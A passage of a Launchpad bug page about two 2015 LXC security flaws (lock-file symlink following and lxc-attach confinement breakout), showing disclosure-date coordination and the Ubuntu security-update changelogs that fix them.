        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+attachment/4429477/+files/0001-lxclock-use-run-lxc-lock-rather-than-run-lock-lxc.patch">0001-lxclock-use-run-lxc-lock-rather-than-run-lock-lxc.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1470842/+attachment/4429477">Edit</a>
        (3.2 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Attaching the agreed upon and tested fix for this bug.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Attaching the agreed upon and tested fix for this bug.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/14" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-15T15:59:34.326347+00:00" title="2015-07-15 15:59:34 UTC">on 2015-07-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/14"> #14</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The coordinated release date (CRD) is 2015-07-21 14:00 UTC</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The coordinated release date (CRD) is 2015-07-21 14:00 UTC </textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/15" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-16T19:30:39.030779+00:00" title="2015-07-16 19:30:39 UTC">on 2015-07-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/15"> #15</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Roman - Would you be open to delaying the previously stated CRD (in comment #14)? I&#x27;d prefer that we publicly disclose both issues, this bug and <a href="/bugs/1475050" class="bug-link">bug #1475050</a>, at the same time since this makes it easier on downstream consumers of LXC.</p>
<p>We&#x27;re working to identify the best fix for <a href="/bugs/1475050" class="bug-link">bug #1475050</a> but the previously agreed upon CRD for this bug is probably going to be cutting it close.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Roman - Would you be open to delaying the previously stated CRD (in comment #14)? I'd prefer that we publicly disclose both issues, this bug and bug #1475050, at the same time since this makes it easier on downstream consumers of LXC.

We're working to identify the best fix for bug #1475050 but the previously agreed upon CRD for this bug is probably going to be cutting it close.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/16" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-17T00:28:15.175048+00:00" title="2015-07-17 00:28:15 UTC">on 2015-07-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/16"> #16</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Roman - Now that we have a fix for <a href="/bugs/1475050" class="bug-link">bug #1475050</a>, I&#x27;d like a CRD of 2015-07-22 14:00 UTC for both of the issues. Let me know if you have any problems with that date.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Roman - Now that we have a fix for bug #1475050, I'd like a CRD of 2015-07-22 14:00 UTC for both of the issues. Let me know if you have any problems with that date.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/17" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-17T07:28:04.580124+00:00" title="2015-07-17 07:28:04 UTC">on 2015-07-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/17"> #17</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Tyler: Completely OK for me. Thanks for your efforts!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Tyler: Completely OK for me. Thanks for your efforts!</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
    
    <time title="2015-07-22 10:15:14 UTC" datetime="2015-07-22T10:15:14.550925+00:00">on 2015-07-22</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/18" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-22T14:12:24.454075+00:00" title="2015-07-22 14:12:24 UTC">on 2015-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/18"> #18</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package lxc - 1.1.0~alpha2-<wbr />0ubuntu3.<wbr />3</p>
<p>---------------<br />
lxc (1.1.0~<wbr />alpha2-<wbr />0ubuntu3.<wbr />3) utopic-security; urgency=medium</p>
<p>&nbsp;&nbsp;* SECURITY UPDATE: Arbitrary file creation via unintentional symlink<br />
&nbsp;&nbsp;&nbsp;&nbsp;following when accessing an LXC lock file (LP: <a href="/bugs/1470842" class="bug-link">#1470842</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />0009-CVE-<wbr />2015-1331.<wbr />patch: Use /run/lxc/lock, rather than<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/<wbr />run/lock/<wbr />lxc, as /run and /run/lxc is only writable by root. Based on<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;patch from upstream.<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2015-1131<br />
&nbsp;&nbsp;* SECURITY UPDATE: Container AppArmor/SELinux confinement breakout via<br />
&nbsp;&nbsp;&nbsp;&nbsp;lxc-attach using a potentially malicious container proc filesystem to<br />
&nbsp;&nbsp;&nbsp;&nbsp;initialize confinement (LP: <a href="/bugs/1475050" class="bug-link">#1475050</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />0010-CVE-<wbr />2015-1334.<wbr />patch: Use the host&#x27;s proc filesystem<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;to set up AppArmor profile and SELinux domain transitions during<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lxc-attach. Based on patch from upstream.<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2015-1334</p>
<p>&nbsp;-- Tyler Hicks &lt;email address hidden&gt;  Fri, 17 Jul 2015 10:57:56 -0500</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package lxc - 1.1.0~alpha2-0ubuntu3.3

---------------
lxc (1.1.0~alpha2-0ubuntu3.3) utopic-security; urgency=medium

  * SECURITY UPDATE: Arbitrary file creation via unintentional symlink
    following when accessing an LXC lock file (LP: #1470842)
    - debian/patches/0009-CVE-2015-1331.patch: Use /run/lxc/lock, rather than
      /run/lock/lxc, as /run and /run/lxc is only writable by root. Based on
      patch from upstream.
    - CVE-2015-1131
  * SECURITY UPDATE: Container AppArmor/SELinux confinement breakout via
    lxc-attach using a potentially malicious container proc filesystem to
    initialize confinement (LP: #1475050)
    - debian/patches/0010-CVE-2015-1334.patch: Use the host's proc filesystem
      to set up AppArmor profile and SELinux domain transitions during
      lxc-attach. Based on patch from upstream.
    - CVE-2015-1334

 -- Tyler Hicks &lt;tyhicks@canonical.com&gt;  Fri, 17 Jul 2015 10:57:56 -0500</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/19" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-22T14:12:25.546423+00:00" title="2015-07-22 14:12:25 UTC">on 2015-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/19"> #19</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package lxc - 1.1.2-0ubuntu3.1</p>
<p>---------------<br />
lxc (1.1.2-0ubuntu3.1) vivid-security; urgency=medium</p>
<p>&nbsp;&nbsp;* SECURITY UPDATE: Arbitrary file creation via unintentional symlink<br />
&nbsp;&nbsp;&nbsp;&nbsp;following when accessing an LXC lock file (LP: <a href="/bugs/1470842" class="bug-link">#1470842</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />0008-CVE-<wbr />2015-1331.<wbr />patch: Use /run/lxc/lock, rather than<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/<wbr />run/lock/<wbr />lxc, as /run and /run/lxc is only writable by root. Based on<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;patch from upstream.<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2015-1131<br />
&nbsp;&nbsp;* SECURITY UPDATE: Container AppArmor/SELinux confinement breakout via<br />
&nbsp;&nbsp;&nbsp;&nbsp;lxc-attach using a potentially malicious container proc filesystem to<br />
&nbsp;&nbsp;&nbsp;&nbsp;initialize confinement (LP: <a href="/bugs/1475050" class="bug-link">#1475050</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />0009-CVE-<wbr />2015-1334.<wbr />patch: Use the host&#x27;s proc filesystem<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;to set up AppArmor profile and SELinux domain transitions during<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lxc-attach. Based on patch from upstream.<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2015-1334</p>
<p>&nbsp;-- Tyler Hicks &lt;email address hidden&gt;  Fri, 17 Jul 2015 10:57:31 -0500</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package lxc - 1.1.2-0ubuntu3.1

---------------
lxc (1.1.2-0ubuntu3.1) vivid-security; urgency=medium

  * SECURITY UPDATE: Arbitrary file creation via unintentional symlink
    following when accessing an LXC lock file (LP: #1470842)
    - debian/patches/0008-CVE-2015-1331.patch: Use /run/lxc/lock, rather than
      /run/lock/lxc, as /run and /run/lxc is only writable by root. Based on
      patch from upstream.
    - CVE-2015-1131
  * SECURITY UPDATE: Container AppArmor/SELinux confinement breakout via
    lxc-attach using a potentially malicious container proc filesystem to
    initialize confinement (LP: #1475050)
    - debian/patches/0009-CVE-2015-1334.patch: Use the host's proc filesystem
      to set up AppArmor profile and SELinux domain transitions during
      lxc-attach. Based on patch from upstream.
    - CVE-2015-1334

 -- Tyler Hicks &lt;tyhicks@canonical.com&gt;  Fri, 17 Jul 2015 10:57:31 -0500</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/20" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-22T14:12:26.366172+00:00" title="2015-07-22 14:12:26 UTC">on 2015-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/20"> #20</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package lxc - 1.0.7-0ubuntu0.2</p>
<p>---------------<br />
lxc (1.0.7-0ubuntu0.2) trusty-security; urgency=medium</p>
<p>&nbsp;&nbsp;* SECURITY UPDATE: Arbitrary file creation via unintentional symlink<br />
&nbsp;&nbsp;&nbsp;&nbsp;following when accessing an LXC lock file (LP: <a href="/bugs/1470842" class="bug-link">#1470842</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />0001-CVE-<wbr />2015-1331.<wbr />patch: Use /run/lxc/lock, rather than<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/<wbr />run/lock/<wbr />lxc, as /run and /run/lxc is only writable by root. Based on<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;patch from upstream.<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2015-1131<br />
&nbsp;&nbsp;* SECURITY UPDATE: Container AppArmor/SELinux confinement breakout via<br />
&nbsp;&nbsp;&nbsp;&nbsp;lxc-attach using a potentially malicious container proc filesystem to<br />
&nbsp;&nbsp;&nbsp;&nbsp;initialize confinement (LP: <a href="/bugs/1475050" class="bug-link">#1475050</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />0002-CVE-<wbr />2015-1334.<wbr />patch: Use the host&#x27;s proc filesystem<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;to set up AppArmor profile and SELinux domain transitions during<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lxc-attach. Based on patch from upstream.<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2015-1334</p>
<p>&nbsp;-- Tyler Hicks &lt;email address hidden&gt;  Fri, 17 Jul 2015 10:58:00 -0500</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package lxc - 1.0.7-0ubuntu0.2

---------------
lxc (1.0.7-0ubuntu0.2) trusty-security; urgency=medium

  * SECURITY UPDATE: Arbitrary file creation via unintentional symlink
    following when accessing an LXC lock file (LP: #1470842)
    - debian/patches/0001-CVE-2015-1331.patch: Use /run/lxc/lock, rather than
      /run/lock/lxc, as /run and /run/lxc is only writable by root. Based on
      patch from upstream.
    - CVE-2015-1131
  * SECURITY UPDATE: Container AppArmor/SELinux confinement breakout via
    lxc-attach using a potentially malicious container proc filesystem to
    initialize confinement (LP: #1475050)
    - debian/patches/0002-CVE-2015-1334.patch: Use the host's proc filesystem
      to set up AppArmor profile and SELinux domain transitions during
      lxc-attach. Based on patch from upstream.
    - CVE-2015-1334

 -- Tyler Hicks &lt;tyhicks@canonical.com&gt;  Fri, 17 Jul 2015 10:58:00 -0500</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
    
    <time title="2015-07-22 14:18:40 UTC" datetime="2015-07-22T14:18:40.418763+00:00">on 2015-07-22</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>information type</b>:
      </td>
      <td>
        Private Security &#8594; Public Security
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/21" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-22T19:23:33.598743+00:00" title="2015-07-22 19:23:33 UTC">on 2015-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/21"> #21</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>It is worth noting that I typoed the CVE ID in the changelog. CVE-2015-1131 should have been CVE-2015-1331.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">It is worth noting that I typoed the CVE ID in the changelog. CVE-2015-1131 should have been CVE-2015-1331.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        <div style="float: right;">
          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+activity">See full activity log</a>
        </div>
        <div class="clearfix"></div>

        
          

          
            <div align="center" id="add-comment-login-first">
              To post a comment you must <a href="+login?comments=all">log in</a>.
            </div>
          
        
        
      

      </div><!-- class="top-portlet" -->
      </div><!--- id="maincontentsub"-->
      <div>
        <div id="duplicate-form-container"></div>
        <div id="privacy-form-container"></div>
      </div>
    </div>
            
            
          </div><!-- yui-b -->
        </div><!-- yui-main -->

        
          <div id="side-portlets" class="yui-b side">
            
      <div id="involvement" class="portlet">
        <ul class="involvement">
          <li class="single">
            <a class="sprite bugs" href="/ubuntu/+source/lxc/+filebug">
              Report a bug
            </a>
          </li>
        </ul>
      </div>
      <div id="privacy" class="first portlet public">
  <div id="privacy-text">
     <span id="information-type-summary" class="sprite public">This report contains
         <strong id="information-type">Public Security</strong>
         information
     </span>&nbsp;<a class="sprite edit action-icon" id="privacy-link" href="/ubuntu/+source/lxc/+bug/1470842/+secrecy">Edit</a>

     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
</div>
  </div>
</div>

      <div id="portlet-actions" class="portlet vertical">
  <ul id="duplicate-actions">
    <li class="sprite bug-dupe">
    <span id="mark-duplicate-text">
    <a class="menu-link-mark-dupe" href="/ubuntu/+source/lxc/+bug/1470842/+duplicate">Mark as duplicate</a>
    </span>
    </li>
    
    <li><a class="menu-link-createquestion sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+create-question">Convert to a question</a></li>
    
    <li><a class="menu-link-addbranch sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+addbranch">Link a related branch</a></li>
    <li><a class="menu-link-linktocve sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+linkcve">Link to <abbr title="Common Vulnerabilities and Exposures Index">CVE</abbr></a></li>
    <li><a class="menu-link-unlinkcve sprite modify remove" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+unlinkcve">Remove CVE link</a></li>
  </ul>
</div>

      

      <div class="portlet vertical" id="portlet-subscription">
  <div class="section">
    <div id="current_user_subscription" class="False">
      
        <span>You are</span>
        
        <a class="menu-link-subscription sprite modify edit" href="/ubuntu/+source/lxc/+bug/1470842/+subscribe">
           
           
           
           not directly subscribed to this bug's notifications.
        </a>
      
      
    </div>
    <div id="sub-unsub-spinner">Subscribing...</div>
    <ul>
      
      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
    </ul>
  </div>
  <script type="text/javascript">
    LPJS.use('io-base', 'node',
            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
        Y.on('domready', function() {
            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
        });
    });
  </script>
</div>

      <div class="portlet vertical" id="portlet-subscribers">
  <h2>Other bug subscribers</h2>
  <div>
    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
  </div>
  <div id="other-bug-subscribers"></div>
</div>

      

      

      
  <div class="portlet" id="portlet-patches">
    <h2>Patches</h2>
    <ul>
      <li class="download-attachment">
